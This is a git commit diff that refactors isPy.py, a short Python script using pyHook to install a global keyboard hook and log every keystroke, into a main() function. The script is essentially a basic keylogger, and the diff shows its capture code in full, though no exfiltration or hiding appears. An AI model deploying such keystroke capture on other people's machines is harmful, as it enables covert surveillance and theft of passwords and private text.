4a3253b7ccb18133280d41f943ad674dd0a39acb
Ben Leonard-Lagarde <leonardlagardeb@gmail.com>
2015-10-12 23:14:28 +0100

    Cleaned up code
    Added main() entry point

--- isPy.py
+++ isPy.py
@@ -19,15 +19,18 @@ def OnKeyboardEvent(event):
     	logging.info('Ascii Key: %s', chr(event.Ascii))
     else:
     	logging.info('Key: %s', event.Key)
+	# return True to pass the event to other handlers
+	return True
 
-# return True to pass the event to other handlers
-    return True
+def main():
+	# create a hook manager
+	hm = pyHook.HookManager()
+	# watch for all mouse events
+	hm.KeyDown = OnKeyboardEvent
+	# set the hook
+	hm.HookKeyboard()
+	# wait forever
+	pythoncom.PumpMessages()
 
-# create a hook manager
-hm = pyHook.HookManager()
-# watch for all mouse events
-hm.KeyDown = OnKeyboardEvent
-# set the hook
-hm.HookKeyboard()
-# wait forever
-pythoncom.PumpMessages()
+if __name__ == "__main__":
+    main()	
